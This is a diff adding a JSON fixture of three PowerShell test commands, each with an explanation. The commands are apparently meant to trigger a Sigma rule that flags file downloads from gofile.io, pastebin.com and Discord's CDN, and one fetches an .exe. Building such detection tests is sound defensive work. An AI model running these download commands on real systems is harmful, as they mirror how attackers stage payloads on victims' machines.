@@ -1,0 +1,14 @@
+[
+  {
+    "output": "powershell.exe -Command \"Invoke-WebRequest -Uri 'https://gofile.io/download/abc123' -OutFile 'C:\\Temp\\downloadedfile.txt'\"",
+    "explanation": "This command uses PowerShell to download a file from a file-sharing domain (gofile.io), which is included in the Sigma rule's detection list. It uses the 'Invoke-WebRequest' command, which is also flagged by the rule. This is a valid test command that should trigger the Sigma rule."
+  },
+  {
+    "output": "pwsh -c \"(New-Object System.Net.WebClient).DownloadFile('https://pastebin.com/raw/xyz789', 'C:\\Users\\Public\\data.txt')\"",
+    "explanation": "This command uses pwsh (PowerShell Core) to download a file from a file-sharing domain (pastebin.com), which is included in the Sigma rule's detection list. It uses the WebClient class's DownloadFile method, which is also flagged by the rule. This is a valid test command that should trigger the Sigma rule."
+  },
+  {
+    "output": "powershell.exe -Command \"wget 'https://cdn.discordapp.com/attachments/1234567890/0987654321/file.exe' -OutFile 'C:\\Users\\User\\Downloads\\file.exe'\"",
+    "explanation": "This command uses the 'wget' alias in PowerShell to download a file from a file-sharing domain (cdn.discordapp.com), which is included in the Sigma rule's detection list. This is a valid test command that should trigger the Sigma rule."
+  }
+]
